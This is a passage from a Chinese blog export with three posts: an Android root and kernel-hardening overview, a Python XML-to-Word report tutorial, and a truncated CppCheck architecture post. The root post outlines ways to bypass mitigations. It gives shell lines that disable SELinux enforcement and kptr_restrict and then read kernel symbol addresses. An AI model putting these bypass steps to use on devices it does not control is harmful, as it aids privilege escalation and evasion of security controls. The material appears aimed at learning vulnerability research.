{"meta":{"title":"Let_go","subtitle":null,"description":null,"author":"Let_go","url":"http://github.com"},"pages":[{"title":"","date":"2018-01-31T16:34:18.752Z","updated":"2018-01-31T16:34:18.752Z","comments":false,"path":"categories/index.html","permalink":"http://github.com/categories/index.html","excerpt":"","text":""},{"title":"All tags","date":"2018-01-31T16:19:57.000Z","updated":"2018-01-31T16:25:14.742Z","comments":true,"path":"tags/index-2.html","permalink":"http://github.com/tags/index-2.html","excerpt":"","text":""},{"title":"","date":"2018-07-27T17:51:39.999Z","updated":"2018-07-27T17:51:39.999Z","comments":false,"path":"tags/index.html","permalink":"http://github.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"Android-Root总结","slug":"Android-Root总结","date":"2019-05-07T02:13:26.000Z","updated":"2019-05-12T16:15:42.390Z","comments":true,"path":"2019/05/07/Android-Root总结/","link":"","permalink":"http://github.com/2019/05/07/Android-Root总结/","excerpt":"","text":"Android-Root总结 前言Root介绍什么是Rootroot在linux中是超级管理员的意思，我们常说的获取root其实就是获取系统最高权限的意思。那为什么我们要获取系统的最高权限呢？最开始是因为某些手机厂商联合运行商，在手机中预装了许多烦人的应用来打造一个封闭的生态圈，并且一般用户是没有权限卸载这些应用的，强制用户使用这些应用。后来为了让手机用户摆脱厂商的这种限制，有人就搞出了对手机进行root的工具。通过这类工具可以获取系统最高权限，让被root后的手机用起来更舒服，更自由。比如卸载手机内置的烦人的软件，禁止开机启动项，实现对手机的各种定制化，在手机空间较小的情况下还可以用来优化手机。但是这些应用在方便了用户的同时也为病毒制作者开了一扇窗，对于被root后的手机病毒可以做的各种不可告人的操作也变得更多。因此各个手机厂商和Google就对android添加了各种保护机制和检测方法，避免手机被root。导致现在想要获取手机root远没有之前那般容易了。当然现今一些手机厂商也会内置root权限的开关，不过对于现在的手机远比以前的手机内存大，运行速度快所以国内root的需求也没有以前那么大了，现在对手机root可能更多是为了满足病毒，取证方面的需求吧。不过像国外的一些国家和我们几年前的情况差不多，目前还存在一定的手机root需求的。[]上图为root工具工作原理 如何获取Root目前我们比较常用的获取root方法有通过刷机获取，通过漏洞利用获取，一般刷机获取的话可能需要清空当前设备的数据在某些情况下存在局限性，所以最好就是利用漏洞去获取系统最高权限当然难度更高，然后在高权限下替换或添加权限管理程序也就是我们常说的su，比较常用的su程序包括SuperSU，Magisk。个人感觉Magisk比较好用。 常见的提权操作通过漏洞进行提权常规的套路就是利用一个低权限进程利用漏洞直接获取高权限，方法很多可以通过修改这个低权限进程内核中的关键结构体，或者直接调用内核提供的权限提升函数(commit_creds(prepare_kernel_cred(0)))，这种方法可能有时候需要patch内核代码(比如利用setreuid函数接口时)，又或者替换内核代码把内核在某种情况下要启动的可执行文件的路径改为我们自定义的路径(hotplug利用：ls -l /proc/sys/kernel/hotplug)，还有就是通过修改系统配置文件进行提权比如bootloader漏洞提权，以及利用漏洞替换系统文件进行提权DirtyCow的一个实例。在无法通过低权限提升到高权限的情况下我们也可以把目标转到已经存在高权限的进程中，通过这些高权限进程的漏洞，依然可以获取root权限。 临时root和永久rootroot还分为永久root和临时root，临时root就是在提权成功直到系统关机这段时间拥有root权限，每次系统重启后都需要重新进行提权。主要是Android4.4以及更高版本的系统在启动时内核会使用dm-verity功能进行验证启动，验证原理是最开始会建立一条从受硬件保护的信任根到引导加载程序，再到启动分区和其他已验证分区(system,vendor和可选的OEM分区)的完整信任链(加密散列树)。设备在启动时进入下个阶段之前会先校验下个阶段的完整性和真实性。这样就有效阻止了提权时植入的拥有持久Root权限的Rootkit。除了有系统完整性检查以外还内置了回滚保护机制，避免攻击者回滚到之前存在漏洞的系统进行攻击。存在回滚保护的设备只会更新到更高的Android系统。实现原理就是使用防篡改的存储空间记录最新一次android版本的信息。并在Android版本低于记录的版本时拒绝启动Android。加密散列树的原理就是把数据按4k为一块，树中每个节点都是加密hash，其中叶节点包含物理数据块的hash，并且中间节点包含其子节点的hash。因为根节点中的哈希是基于所有子节点的值，所以只有根节点被信任才能验证树的其余部分，对于任何一个节点块的修改都会破坏整个加密hash。 缓解措施一些root的检测方法下面列出一些用来检测手机是否被root的方法，都是一些比较简单的检测，存在各自的缺点，没有通用的检测方法，还是需要根据实际情况灵活使用。 检查是否存在权限管理应用 123456789101112131415手动检查：ls -l /system/app/Superuser.apkpm list packages | grep eu.chainfire.supersupm list packages | grep magisk自动检查：public static boolean checkSuperuserApk()&#123; try &#123; File file = new File(\"/system/app/Superuser.apk\"); if (file.exists()) &#123; Log.i(LOG_TAG,\"/system/app/Superuser.apk exist\"); return true; &#125; &#125; catch (Exception e) &#123; &#125; return false; &#125; 检查是否存在不需要的二进制文件，路径可能不一致。 12345678910111213141516171819202122手动检查：ls -l /system/bin/su /system/xbin/suls -l system/su /system/bin/.ext/.suls -l /system/usr/we-need-root/su-backupfind / -name \"*su*\" 2&gt;/dev/null /*搜索根目录下所有文件，列出名字带su的文件路径*/自动检查：public static boolean checkRootPathSU() &#123; File f=null; final String kSuSearchPaths[]=&#123;\"/system/bin/\",\"/system/xbin/\",\"/system/sbin/\",\"/sbin/\",\"/vendor/bin/\"&#125;; try&#123; for(int i=0;i&lt;kSuSearchPaths.length;i++) &#123; f=new File(kSuSearchPaths[i]+\"su\"); if(f!=null&amp;&amp;f.exists()) &#123; Log.i(LOG_TAG,\"find su in : \"+kSuSearchPaths[i]); return true; &#125; &#125; &#125;catch(Exception e) &#123; e.printStackTrace(); &#125; return false; &#125; 检查shell权限的id 12id | grep rootps | grep adbd | grep root 检查文件系统的读写属性是否被更改(RW等) 123456手动检查：bullhead:/ $ mount | grep system/dev/block/mmcblk0p41 on /system type ext4 (ro,seclabel,relatime,inode_readahead_blks=8)/dev/block/mmcblk0p41 on /sbin/.core/mirror/system type ext4 (ro,seclabel,relatime,inode_readahead_blks=8)ls -lR /system | grep -e :$ -e [r-][w-]xls -laR /system | grep [r-][w-]s[-r' '] 检查当前设备使用的是否为自定义内核，通过设备的ro.build.tags值来区分”test-keys”表示测试版，”release-keys”表示发布版，当然这种方法也可能误报。1234567891011walleye:/ $ getprop | grep ro.build.tags[ro.build.tags]: [release-keys]public static boolean checkDeviceDebuggable()&#123; String buildTags = android.os.Build.TAGS; if (buildTags != null &amp;&amp; buildTags.contains(\"test-keys\")) &#123; Log.i(LOG_TAG,\"buildTags=\"+buildTags); return true; &#125; return false; &#125; 开源的Root检查项目：检测Rooot项目-RootBeer反检测Root项目-Rootcloak 内核层的缓解措施内核版本3.4： mmap_min_addr(zero-page restrict)：限制mmap函数可映射的最低地址：缓解机制：因为没有对mmap地址范围做任何限制，应用层可以映射0页面，null pointer deref漏洞当时就是利用这个机制进行提权，后期针对这种漏洞推出了mmap_min_addr线程，限制mmap可以映射的最低地址，目前null pointer deref漏洞只能做一般的dos攻击 Kernel Address Display Restriction/dmesg restrictions：由于之前常用提权套路是从/proc/kallsyms搜索符号commit_creds和prepare_kernel_cred的地址，然后在用户态通过这两个符号构造提权函数，接着利用漏洞改写某个内核函数指针，将其函数指针替换为前面构造的提权函数，最后在用户态调用被改写的fsync函数，这样内核就直接执行用户态的提权函数完成提权，后期内核推出了该机制使得默认配置下无法从/proc/kallsyms等接口获取内核符号的地址 123456/proc/sys/kernel/dmesg_restrict/proc/sys/kernel/kptr_restrict选项:用来过滤一些地址，以此避免将内核地址泄漏给攻击者，通过配置kptr_restrict的值来控制是否开启: * 0:完全禁止 * 1:使用\"%pk\"打印的内核指针被隐藏(以0替换)，除非用户存在CAP_SYSLOG权限。 * 2:所有内核使用\"%pk\"打印的都被隐藏 SEAndroid(MAC)：强制访问控制，比常规自主访问控制(DAC)粒度更细 内核版本3.10~3.18： 页面权限限制 内核代码段不可写(R-W) 内核数据段不可执行(R– or RW-) PXN(Privilege Execute Never)：主要是用来防止内核态执行用户态代码，因为之前的漏洞利用方式是直接劫持内核执行流到用户态的shellcode进行提权，通过该机制有效保护了内核的执行范围。 RKP(内核实时保护，三星KNOX保护) 内核版本4.4+： Post-init read-only：主要用来限制利用vdso布置shellcode的措施，由于之前vdso区域可写，所以有些漏洞利用就通过patch掉这块内存把恶意代码布置到这块内存上来实现shellcode的执行。该机制通过在内核初始化后把该内存区域标记为只读来扩展内核中的现有内存保护。 Hardened usercopy：之前许多漏洞都是因为在使用copy_user时边界检查不严造成的，所以开发人员干脆直接在copy_user类函数内部添加了对拷贝位置和拷贝长度的检查。 PAN(Privileged Access Never)：其主要作用就是防止内核态去访问用户态的数据，成功防止了一些用于绕过PXN机制的技巧，让利用漏洞的难度加大。 KASLR：因为漏洞利用时内核地址十分重要，所以把内核地址变为随机地址会大大增加漏洞利用难度，原理就是在bootloader启动kernel的时候，会通过FDT向内核传入一个seed，在内核启动过程中，kaslr_early_init函数利用这个seed计算出一个random size，然后内核每次加载的基址都会默认在原基址上加上random size。 Integer Overflow Sanitization(整数溢出排除)：一种基于编译器的安全缓解措施，针对算术运算/指令(可能溢出)的检查，以便在实际发生溢出时安全终止进程，该类排错程序可以减少整数溢出导致的各种内存损坏和信息泄露。 Control Flow Integrity(控制流完整性)：一种基于编译器的安全缓解措施，避免攻击者利用漏洞时使用代码复用技巧(ROP/JOP)，控制流完整性实现了将原始程序的控制流限制在编译时确定的有效目标的调用图中。跳转之前先验证下目标地址是否为合法的地址，否则内核崩溃。 感觉最好的缓解机制还是减少攻击面和增加访问控制：减少攻击面的好处让攻击者在受限的范围内寻找漏洞，增加访问控制后(SELinux，DAC权限控制，Capabilities)使大多数漏洞在利用时都受到了限制，无法直接进行提权。解决问题最好的办法就是解决提出问题的。 缓解措施绕过技巧 Kernel Address Display Restriction/dmesg restrictions:1.利用信息泄露漏洞获取内核地址2.通过直接在内存空间搜索kptr_restrict地址，关闭Kernel Address Display Restriction2.1:在kernel\\sysctl.c文件中存在对kptr_restrict的sysctl结构体初始化操作，我们可以通过内存遍历获取到kptr_restrict符号的地址，然后修改为0，这样就关闭了kptr_restrict保护机制 SEAndroid：1.selinux_enforcing,selinux_enable设置为0直接关闭2.修改reset_security_ops() RKP(内核实时保护机制-三星设备KNOX保护)1.Bypassing KNOX PXN(Privilege Execute Never): 1.使用rop/jop等代码重用技巧绕过PXN，改写addr_limit的值，破除本进程的系统调用access_ok校验，实现对内核的任意读写。 2.Ret2dir/Physmap：通过把shellcode布局到合规的地址，从而进行提权。 Kaslr：利用信息泄露类漏洞 PAN：任意读写类漏洞可绕过PAN保护。 CFI：* 一些攻击面 常规攻击面包括浏览器，系统自带服务，第三方应用程序，应用升级相关：某些应用在升级时未对下载的升级包做验证，攻击者就可以替换官方升级包为恶意应用，这样最终安装的就是攻击者指定的应用，工程模式， USSD指令：使用手机拨号输入一些预先制定的数字或者符号比如*#等，可能触发一些手机设备预留的后门操作。媒体和文档处理：一些应用在对文件处理时可能考虑的不够完善，导致处理一些畸形文件时出现问题。 无线通信相关GPS，基带，蓝牙，Wi-Fi，NFC。 本地的攻击面有linux系统调用，网络套接字协议，进程间的通讯，进程间内存共享以及第三方硬件驱动，bootloader。 物理攻击面有直接对设备进行拆解以后，可能存在暴露的串口允许接受调试信息，暴露的JTAG调试端口允许对设备进行调试。 漏洞相关最后来看两个比较有趣的提权漏洞的利用细节，首先是我们如何获取最新的漏洞信息，接着是拿到了漏洞以后如何确定漏洞是否可以利用，在可以利用的情况下如何利用，帮助大家构建一个学习Android漏洞的系统体系。 分析漏洞流程获取漏洞信息漏洞的获取对于漏洞的获取可以关注一些公众号比如玄武实验室的每日公告，天融信阿尔法实验室的每日公告，还有许多公众号都不错。但是一般这些公众号都会在固定的时候发。一般如果出了比较厉害的漏洞或一些新技术都会很快在各大社交应用中传播，所以平时我们还可以多关注一些国内外大佬的推特，微博，还有就是每个月的Google的Android安全公告。如果我们想早于别人之前获取漏洞信息那么我们可以关注一些首发网站，比如bugs.chromium.org这网站我感觉挺不错的，会公布一些漏洞细节，并且还挺详细。还有Android内核补丁网站和Linux内核补丁网站获取最新的补丁信息，可以通过补丁信息推测出一些相关类型的漏洞或者通过补丁分析获取一些被偷偷修补了的洞。最后就是通过结交一些相关领域的朋友组成自己的小圈子，很多消息都在一些小圈子中飞，提高自己的信息获取能力。 通过crash log定位内核异常当我们有了该漏洞的poc以后我们可以找一个测试机，然后在测试机上跑一下看能否崩溃，如果可以崩溃接下来就去获取崩溃日志，然后分析崩溃日志根据日志定位到崩溃代码的位置，也有可能崩溃的地方与实际漏洞的位置不在一处或者多次运行崩溃的地址都不一样，这就需要根据实际的情况详细分析了，对于内存相关的漏洞我们可以使用开启了KASAN选项的测试机，这样崩溃时内核给我们的信息会更多一些。 常见的几个崩溃日志文件cat /sys/fs/pstore/console-ramoopscat /proc/last_kmsgcat /proc/kmsg 获取内核函数的地址echo 0&gt; /sys/fs/selinux/enforceecho 0 &gt; /proc/sys/kernel/kptr_restrictcat /proc/kallsyms |grep ptmx_fops 漏洞分析方法静态分析-&gt;解包固件并分析内核内核镜像分析获取固件的方式分为两种一种是在网上找相应版本的固件包获取镜像，一种是直接dump当前手机的内核镜像。由于第二种需要root权限，所以第一种最方便也最简单，但是这里主要说下第二种，首先我们需要一个带root的手机，通过adb shell连接手机，然后使用以下命令把手机中包含内核的镜像dump出来，路径可能不一样，一般都在/dev/block/platform/目录下，多找几层就能看到。1234567891011121314151617181920212223bullhead:/ # ls -l /dev/block/platform/soc.0/f9824900.sdhci/by-name/lrwxrwxrwx 1 root root 21 1970-08-04 08:13 DDR -&gt; /dev/block/mmcblk0p28lrwxrwxrwx 1 root root 20 1970-08-04 08:13 aboot -&gt; /dev/block/mmcblk0p8lrwxrwxrwx 1 root root 21 1970-08-04 08:13 abootbak -&gt; /dev/block/mmcblk0p14lrwxrwxrwx 1 root root 21 1970-08-04 08:13 apdp -&gt; /dev/block/mmcblk0p17lrwxrwxrwx 1 root root 21 1970-08-04 08:13 boot -&gt; /dev/block/mmcblk0p37 /*------------boot 当前内核进行指向/dev/block/mmcblk0p37---------------*/lrwxrwxrwx 1 root root 21 1970-08-04 08:13 cache -&gt; /dev/block/mmcblk0p40[...]lrwxrwxrwx 1 root root 21 1970-08-04 08:13 vendor -&gt; /dev/block/mmcblk0p39bullhead:/ # dd if=/dev/block/mmcblk0p37 of=/data/local/tmp/boot.img65536+0 records in65536+0 records out33554432 bytes transferred in 0.575 secs (58355533 bytes/sec)bullhead:/ # ls -l /data/local/tmp/boot.img-rw------- 1 root root 33554432 2018-02-28 14:26 /data/local/tmp/boot.imgbullhead:/ # chmod 755 /data/local/tmp/boot.imgbullhead:/ # ls -l /data/local/tmp/boot.img-rwxr-xr-x 1 root root 33554432 2018-02-28 14:26 /data/local/tmp/boot.imgbullhead:/ # exitbullhead:/ $ exitC:\\Users\\Administrator&gt;adb pull /data/local/tmp/boot.img/data/local/tmp/boot.img: 1 file pulled. 9.1 MB/s (33554432 bytes in 3.518s)C:\\Users\\Administrator&gt; OK，可以看到我们成功dump了boot进行，但这不是我们最终的内核，我们还需要使用linux下的abootimg工具对该镜像做解包处理才能获取我们最终的镜像。命令如下1abootimg -x boot.img 该命令会把我们dump出来的boot.img解包，会生成几个文件，我们只需要其中的zImage文件就行，它有时候是一个zip包，直接通过解压工具就能解开，解开以后我们把最终的内核丢到IDA中直接就可以分析了。通过前面我们定位到的崩溃地址和获取的函数符号地址，就可以在IDA中分析当时内核执行时上下文了。 源码分析我们还可以使用SourceInsight进行内核的源码分析，分析源码之前我们首先需要下载源码Android官方源码，然后再创建一个SourceInsight项目把前面下载的源码导入到该项目中即可，导入后可能需要一些时间同步函数之间的调用关系，要不了多长时间。感觉SourceInsight用来读源码还是挺好用的。还有一个understand工具用来分析源码也挺方便的，它可以列出目标函数的调用栈，在写poc的时候挺好用的。 动态分析-&gt;GDB调试模拟器动态调试大概流程如下：1.首先我们需要创建一个emulator模拟器，然后启动该模拟器，获取该模拟器的内核版本。2.确定内核版本以后就去下载相应的android内核，并编译该源码。123456789101164位编译配置export ARCH=arm64export SUBARCH=arm64export CROSS_COMPILE=/home/ubuntu/Desktop/work/source/kernel/android-ndk-r10e/toolchains/aarch64-linux-android-4.9/prebuilt/linux-x86_64/bin/aarch64-linux-android-make menuconfig32位编译配置export ARCH=armexport SUBARCH=armexport CROSS_COMPILE=/home/ubuntu/Desktop/work/source/kernel/arm-eabi-4.6/bin/arm-eabi-make goldfish_armv7_defconfig 3.内核编译完毕后使用我们编译的内核去启动第一步的模拟器。1emulator -kernel /work/kernel/goldfish/arch/arm/boot/zImage -show-kernel -verbose -avd 模拟器名 -qemu -s -S 4.启动成功后内核会暂停等待GDB连接，注意在连接内核之前先用GDB加载前面编译出来的vmlinux，这样才能实现对源码的调试。12aarch64-linux-android-gdb ./vmlinuxtarget remote localhost:1234 5.开始GDB单步调试 提权漏洞实例讲解CVE-2017-7533CVE-2018-9568总结“With great power comes great responsibility” — Uncle Ben Parker 参考android系统完整性校验验证启动 检测root的方法Android root检测方法小结Root检测与反检测 防护机制文章https://lwn.net/Security/Index/Linux内核自防护项目的初始文稿Android O 内核加固与缓解机制深入理解SELinux SEAndroidAndroid 内核控制流完整性Android OAndroid PControl Flow Integrity in the Android kernel 绕过相关文章给shellcode找块福地-通过VDSO绕过PXNAndroid PXN绕过技术研究PXN防护技术的研究与绕过Android Kernel Security","categories":[{"name":"Vulnerability","slug":"Vulnerability","permalink":"http://github.com/categories/Vulnerability/"}],"tags":[{"name":"Android_Kernel","slug":"Android-Kernel","permalink":"http://github.com/tags/Android-Kernel/"}]},{"title":"python自动化生成Word报告","slug":"python自动化生成Word报告","date":"2019-04-28T16:51:05.000Z","updated":"2019-04-28T17:06:26.874Z","comments":true,"path":"2019/04/29/python自动化生成Word报告/","link":"","permalink":"http://github.com/2019/04/29/python自动化生成Word报告/","excerpt":"","text":"python自动化生成Word报告 前言这里简单记录下如何使用python脚本去解析一个xml文件并把解析出来的数据以变量的形式插入到docx文件。这样做的主要原因是在工作中需要把某些工具的输出结果(.xml文件)转为docx文件并以报告的形式输出。一般这种报告都存在某种固定的格式，只是一些数据是需要动态填入的。所以我们可以把这些需要动态填入的字段以变量的形式表示，然后通过python脚本解析xml文件并把数据插入到以变量表示的字段处，最后生成最终文档。这样我们就不用做一些无趣的复制粘贴工作，大大提高了工作效率。 XML解析首先第一步，通过python如何解析一个xml文件？目前我知道的有2种方法。1.通过python标准库SAX(simple API for XML)解析器解析。SAX用事件驱动模型，通过在解析XML的过程中触发一个个事件并调用用户定义的回调函数来处理XML文件，这种方法解析XML的好处就是以流式读取XML文件比较快，并且占内存少，但需要用户定义回到函数。2.通过DOM(Document Object Model)方式将XML文件载入到内存中，并解析为一棵树的形式，通过对树的操作来实现解析XML文件。这种方式由于需要把XML数据全部映射到内存中，所以会比较慢，并且比较耗内存。但感觉比SAX要灵活。 使用SAX解析XML1.SAX是基于事件驱动实现的，利用SAX解析XML文档会涉及到两个部分：解析器和事件处理器。解析器负责解析XML文件，并在关键时候向事件处理器发送时间比如在元素开始或元素结束时。时间处理器则负责对接收到的事件做响应，主要是调用用户注册的回调函数。以下列出一些比较关键的函数：1.文档启动时：startDocument()方法2.到达文档结尾时：endDocument()方法3.遇到XML开始标签时：startElement(name，attrs)方法4.遇到XML结尾标签时：endElement(name)方法5.创建新的解析器对象：make_parser()方法6.创建一个SAX解析器并解析XML文档：parser()方法实例：目标XML文件123456789101112131415161718192021222324252627282930&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;results version=\"2\"&gt; &lt;errors&gt; &lt;error id=\"arrayIndexOutOfBounds\" severity=\"error\" msg=\"Array &amp;apos;a[10]&amp;apos; accessed at index 10, which is out of bounds.\" verbose=\"Array &amp;apos;a[10]&amp;apos; accessed at index 10, which is out of bounds.\" cwe=\"119\"&gt; &lt;location file=\" /cpp/arrayindexoutofbounds.cpp\" line=\"11\" info=\"Array index out of bounds\"/&gt; &lt;location file=\" /cpp/arrayindexoutofbounds.cpp\" line=\"7\" info=\"Assignment &amp;apos;max=10&amp;apos;, assigned value is 10\"/&gt; &lt;symbol&gt;a&lt;/symbol&gt; &lt;/error&gt; &lt;error id=\"returnDanglingLifetime\" severity=\"error\" msg=\"Returning pointer to local variable &amp;apos;sz&amp;apos; that will be invalid when returning.\" verbose=\"Returning pointer to local variable &amp;apos;sz&amp;apos; that will be invalid when returning.\" cwe=\"562\"&gt; &lt;location file=\" /cpp/autovar.cpp\" line=\"5\"/&gt; &lt;location file=\" /cpp/autovar.cpp\" line=\"3\" info=\"Variable created here.\"/&gt; &lt;location file=\" /cpp/autovar.cpp\" line=\"5\" info=\"Array decayed to pointer here.\"/&gt; &lt;/error&gt; &lt;error id=\"bufferAccessOutOfBounds\" severity=\"error\" msg=\"Buffer is accessed out of bounds: sz\" verbose=\"Buffer is accessed out of bounds: sz\"&gt; &lt;location file=\" /cpp/bufferaccessoutofbounds.cpp\" line=\"5\"/&gt; &lt;symbol&gt;sz&lt;/symbol&gt; &lt;/error&gt; &lt;error id=\"nullPointer\" severity=\"error\" msg=\"Null pointer dereference\" verbose=\"Null pointer dereference\" cwe=\"476\"&gt; &lt;location file=\" /cpp/nonthreadsafefunc.cpp\" line=\"5\" info=\"Null pointer dereference\"/&gt; &lt;/error&gt; &lt;error id=\"resourceLeak\" severity=\"error\" msg=\"Resource leak: pFile\" verbose=\"Resource leak: pFile\" cwe=\"775\"&gt; &lt;location file=\" /cpp/resourceleak.cpp\" line=\"8\"/&gt; &lt;symbol&gt;pFile&lt;/symbol&gt; &lt;/error&gt; &lt;error id=\"stlOutOfBounds\" severity=\"error\" msg=\"When ii==foo.size(), foo[ii] is out of bounds.\" verbose=\"When ii==foo.size(), foo[ii] is out of bounds.\" cwe=\"788\"&gt; &lt;location file=\" /cpp/stloutofbounds.cpp\" line=\"7\"/&gt; &lt;symbol&gt;foo&lt;/symbol&gt; &lt;/error&gt; &lt;/errors&gt;&lt;/results&gt; 解析脚本：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#!/usr/bin/python# -*- coding: UTF-8 -*-import xml.sax # 需要先导入xml.sax库class XMLHandler(xml.sax.ContentHandler): def __init__(self): self.CurrentData = \"\" self.location = \"\" self.symbol = \"\" def startElement(self,tag,attributes): self.CurrentData = tag if tag == \"error\": print \"\\n\\n\\n********** error **********\" XMLHandler.echoInfo(self,\"id\",attributes,\"id:\") XMLHandler.echoInfo(self,\"severity\",attributes,\"severity:\") XMLHandler.echoInfo(self,\"msg\",attributes,\"msg:\") XMLHandler.echoInfo(self,\"verbose\",attributes,\"verbose:\") XMLHandler.echoInfo(self,\"cwe\",attributes,\"cwe:\") if tag == \"location\": XMLHandler.echoInfo(self,\"file\",attributes,\"location.file:\") XMLHandler.echoInfo(self,\"line\",attributes,\"location.line:\") XMLHandler.echoInfo(self,\"info\",attributes,\"location.info:\") # def characters(self,content):# if self.CurrentData == \"location\":# file = content[\"file\"]# print \"location.file:\",file# elif self.CurrentData == \"symbol\":# self.symbol = content# def endElement(self,tag):# if self.CurrentData == \"location\":# print \"location:\",self.location# elif self.CurrentData == \"symbol\":# print \"symbol:\",self.symbol def echoInfo(self,tag,attributes,str): if tag in attributes: data = attributes[tag] print str,data else: print str + \" None\"if( __name__ == \"__main__\"): parser = xml.sax.make_parser() # 创建一个XMLReader parser.setFeature(xml.sax.handler.feature_namespaces,0) Handler = XMLHandler() parser.setContentHandler(Handler) parser.parse(\"log.xml\") # 解析目标xml 输出12345678910111213141516171819202122********** error **********id: arrayIndexOutOfBoundsseverity: errormsg: Array 'a[10]' accessed at index 10, which is out of bounds.verbose: Array 'a[10]' accessed at index 10, which is out of bounds.cwe: 119location.file: /cpp/arrayindexoutofbounds.cpplocation.line: 11location.info: Array index out of boundslocation.file: /cpp/arrayindexoutofbounds.cpplocation.line: 7location.info: Assignment 'max=10', assigned value is 10[................................skip...................................]********** error **********id: stlOutOfBoundsseverity: errormsg: When ii==foo.size(), foo[ii] is out of bounds.verbose: When ii==foo.size(), foo[ii] is out of bounds.cwe: 788location.file: /cpp/stloutofbounds.cpplocation.line: 7location.info: None 使用DOM解析XML文本对象模型(Document Object Model)：一个DOM解析器在解析XML文件时需要把整个XML文件一次性载入到内存中，把文档中所有元素都保存在内存中的一棵树结构中，后续可以通过DOM提供的API去解析这颗树，通过不同的函数来读取或修改文档中的内容，这样做的一个缺点就是比较耗内存。实例：同样的目标，不同的解析1234567891011121314151617181920212223242526272829303132333435363738394041#!/usr/bin/python# -*- coding: UTF-8 -*-from xml.dom.minidom import parseimport xml.dom.minidom# 通过minidom解析器打开目标XML文件DOMTree = xml.dom.minidom.parse(\"log.xml\")collection = DOMTree.documentElementif collection.hasAttribute(\"errors\"): print \"Root element: %s\" % collection.getAttribute(\"errors\") # 获取所有元素error = collection.getElementsByTagName(\"error\")for err in error: print \"********* error **********\" if err.hasAttribute(\"id\"): print \"id: %s\" % err.getAttribute(\"id\") if err.hasAttribute(\"severity\"): print \"severity: %s\" % err.getAttribute(\"severity\") if err.hasAttribute(\"msg\"): print \"msg: %s\" % err.getAttribute(\"msg\") if err.hasAttribute(\"verbose\"): print \"verbose: %s\" % err.getAttribute(\"verbose\") if err.hasAttribute(\"cwe\"): print \"cwe: %s\" % err.getAttribute(\"cwe\") location = err.getElementsByTagName(\"location\") for loc in location: if loc.hasAttribute(\"file\"): print \"file: %s\" % loc.getAttribute(\"file\") else: print \"file: \" + 'null' if loc.hasAttribute(\"line\"): print \"line: %s\" % loc.getAttribute(\"line\") else: print \"line: \" + 'null' if loc.hasAttribute(\"info\"): print \"info: %s\" % loc.getAttribute(\"info\") else: print \"info: \" + 'null' 输出12345678910111213141516171819202122********* error **********id: arrayIndexOutOfBoundsseverity: errormsg: Array 'a[10]' accessed at index 10, which is out of bounds.verbose: Array 'a[10]' accessed at index 10, which is out of bounds.cwe: 119file: /cpp/arrayindexoutofbounds.cppline: 11info: Array index out of boundsfile: /cpp/arrayindexoutofbounds.cppline: 7info: Assignment 'max=10', assigned value is 10[..................................skip......................................]********* error **********id: stlOutOfBoundsseverity: errormsg: When ii==foo.size(), foo[ii] is out of bounds.verbose: When ii==foo.size(), foo[ii] is out of bounds.cwe: 788file: /cpp/stloutofbounds.cppline: 7info: null Word报告自动生成这里需要使用python的一个库(docxtpl),该库可以按指定的word模板填充内容设定好的符号字段，一般用来把一些工具跑出的结果填充到word模板中完成工作报告的生成。首先通过以下命令安装该第三方库：1pip install docxtpl 使用：WORD模板文件： Python脚本文件：1234567891011121314151617181920212223#!/usr/bin/python# -*- coding: UTF-8 -*-import timefrom docxtpl import DocxTemplate, InlineImageclass CreateDocx(): def __init__(self,TemplateFileName,NewFileName): self.TemplateFileName = TemplateFileName self.NewFileName = NewFileName def post(self): tpl = DocxTemplate(self.TemplateFileName) # 加载模板文件 localtime = time.asctime( time.localtime(time.time())) context = &#123;'date_1':localtime,'version_1':'v1.0','total_1':'0xFFFF','error_1':'0xFFFF','warning_1':'0xFFFF','style_1':'0xFFFF'&#125; tpl.render(context) # 填充数据 tpl.save(self.NewFileName + '_' + str(time.time()) + '.docx') # 保存目标文件 def writeData(self): passif( __name__ == \"__main__\"): Docx = CreateDocx('./CodeScan.docx','CodeScan'); Docx.post(); WORD结果文件： 总结简单记录下，不然感觉自己每天都不知道干了些啥。唉。。。。。。。。。完整的SAX API链接：https://docs.python.org/3/library/xml.sax.html完整的DOM API链接：https://docs.python.org/3/library/xml.dom.html","categories":[{"name":"python脚本","slug":"python脚本","permalink":"http://github.com/categories/python脚本/"}],"tags":[{"name":"python脚本","slug":"python脚本","permalink":"http://github.com/tags/python脚本/"}]},{"title":"代码审计之CppCheck","slug":"代码审计之CppCheck","date":"2019-04-21T16:10:46.000Z","updated":"2019-04-21T16:40:17.540Z","comments":true,"path":"2019/04/22/代码审计之CppCheck/","link":"","permalink":"http://github.com/2019/04/22/代码审计之CppCheck/","excerpt":"","text":"代码审计之CppCheck 前言这段时间由于工作原因需要实现一款源代码分析工具，在网上搜刮了一波发现一款名叫cppcheck的源代码工具挺不错。还有一款叫TscanCode的也蛮好不过是基于cppcheck写的，并且最后的更新在18年，而cppcheck最近还在更新，所以就选择直接分析cppcheck的整体架构。首先我们来了解一下什么是cppcheck，它是一款对于C/C++代码做静态扫描工具，力求发现源码中存在的一些漏洞，目前支持以下几种类型规则的扫描(只是简单列出一些,还有许多感兴趣的可以下载看看)：1234561.空指针检查，包含可疑的空指针，判空后解引用等共3类subid检查。2.数据越界，Sprintf_S越界共1类subid检查。3.内存泄漏，分配和释放不匹配同1类的subid检查。4.逻辑错误，重复的代码分支，bool类型和int类型比较，表达式恒等或恒不等共18类检查。5.可疑代码检查，if判断中含可疑=号，自由变量返回局部变量共15类检查。6.运算错误，判断无符号数小于0，对bool类型进行++自增等，共11类检查。 架构分析分析开源软件我们首先要了解这个软件的整体架构，这里我打算先从文件结构入手。cppcheck总共分为两个模块，我叫它为前端模块，核心模块。前端模块主要通过对用户的输入(命令行)做分析，得到用户想要的选项，然后把这些选项保存到一个Setting类中。然后解析用户需要分析的文件路径，如果该路径属于一个目录则遍历获取该目录下的所有符合的文件作为目标，保存起来用作后续的分析，如果用户直接给出了目标路径那么直接用就行。完成对目标文件列表的获取之后通过循环遍历把单个文件传给核心模块进行源码分析，分析完成后生成AST（抽象语法树）和符号数据库，利用内置的检测方案类挨个对该符号数据库做模型匹配检查，如果存在相同则判定存在漏洞，通过日志输出模块返回给用户。不断遍历直到所有文件都检查完毕。如果后续需要添加别的检测也挺方便，直接按照原有检测类的格式写一个自己的类就行。 各个类的含义 公共模块 Settings::[字段用来存放用户的选项] ErrorLogger::class[基类:输入输出模块] 前端处理模块(处理用户参数) CppCheckExecutor::class[结合CmdLineParse类初始化Settings类中的成员选项，获取检测文件列表，循环调用CppCheck类的检测接口对文件做检测操作] 